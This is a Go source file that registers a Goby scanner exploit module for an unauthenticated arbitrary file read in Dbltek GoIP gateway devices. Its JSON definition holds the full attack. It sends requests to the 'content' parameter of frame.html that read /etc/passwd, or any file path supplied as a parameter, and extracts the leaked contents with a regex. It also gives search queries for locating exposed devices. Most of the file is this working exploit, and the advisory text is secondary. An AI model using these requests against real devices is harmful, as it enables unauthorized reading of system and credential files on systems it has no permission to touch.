package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dbltek GoIP arbitrary file reading",
    "Description": "<p>DBL DBLTek devices is a GOIP gateway product of China Deborah (DBL) company.</p><p>The web server on DBL DBLTek devices has a security vulnerability, and attackers can arbitrarily read system file information without authorization.</p>",
    "Product": "Dbltek-GoIP",
    "Homepage": "http://www.dbltek.com/",
    "DisclosureDate": "2022-02-20",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "banner=\"/default/en_US/status.html\" || header=\"/default/en_US/status.html\"",
    "GobyQuery": "banner=\"/default/en_US/status.html\" || header=\"/default/en_US/status.html\"",
    "Level": "2",
    "Impact": "<p>By browsing the directory structure, an attacker may access some hidden files including configuration files, logs, source code, etc. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
    "References": [
        "https://www.exploit-db.com/exploits/50775"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/default/en_US/frame.html?content=/etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/ash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/default/en_US/frame.html?content={{{filepath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|vAlign=\"top\" class=\"content\">(?s)(.*?)</td>"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "VulType": [
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Dbltek GoIP 任意文件读取",
            "Product": "Dbltek-GoIP",
            "Description": "<p>DBL DBLTek devices是中国得伯乐（DBL）公司的一款GOIP网关产品。</p><p>DBL DBLTek设备上的Web服务器存在安全漏洞，攻击者可以未经授权任意读取系统文件信息。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
            "Impact": "<p>攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。<br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Dbltek GoIP arbitrary file reading",
            "Product": "Dbltek-GoIP",
            "Description": "<p>DBL DBLTek devices is a GOIP gateway product of China Deborah (DBL) company.</p><p>The web server on DBL DBLTek devices has a security vulnerability, and attackers can arbitrarily read system file information without authorization.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"http://www.dbltek.com/\">http://www.dbltek.com/</a></p>",
            "Impact": "<p>By browsing the directory structure, an attacker may access some hidden files including configuration files, logs, source code, etc. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10679"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}